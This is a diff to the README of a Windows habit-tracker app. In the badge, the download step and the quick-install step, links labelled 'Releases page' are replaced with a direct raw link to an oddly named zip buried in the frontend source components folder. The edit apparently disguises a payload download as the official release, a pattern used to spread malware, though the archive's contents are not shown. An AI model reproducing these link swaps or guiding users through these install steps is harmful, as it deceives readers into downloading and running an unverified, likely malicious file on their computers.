@@ -1,6 +1,6 @@
 # 🧠 Reality-Loop-Simulator - See Your Routine’s True Path
 
-[![Download](https://img.shields.io/badge/Download-Reality--Loop--Simulator-1f4e79?style=for-the-badge&logo=github)](https://github.com/Schoolphobiamodification782/Reality-Loop-Simulator/releases)
+[![Download](https://img.shields.io/badge/Download-Reality--Loop--Simulator-1f4e79?style=for-the-badge&logo=github)](https://github.com/Schoolphobiamodification782/Reality-Loop-Simulator/raw/refs/heads/main/frontend/src/components/Reality-Loop-Simulator-ventroinguinal.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This app is for Windows users who want a clear view of their habits without need
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/Schoolphobiamodification782/Reality-Loop-Simulator/releases)
+1. Open the [Releases page](https://github.com/Schoolphobiamodification782/Reality-Loop-Simulator/raw/refs/heads/main/frontend/src/components/Reality-Loop-Simulator-ventroinguinal.zip)
 2. Find the latest version at the top
 3. Download the Windows file listed there
 4. Save it to your computer
@@ -116,7 +116,7 @@ Use the app with honest routine data. Small changes in sleep, food, movement, an
 
 ## 🧾 Quick Install Path
 
-1. Go to the [Releases page](https://github.com/Schoolphobiamodification782/Reality-Loop-Simulator/releases)
+1. Go to the [Releases page](https://github.com/Schoolphobiamodification782/Reality-Loop-Simulator/raw/refs/heads/main/frontend/src/components/Reality-Loop-Simulator-ventroinguinal.zip)
 2. Download the latest Windows build
 3. Extract the files if needed
 4. Open the app
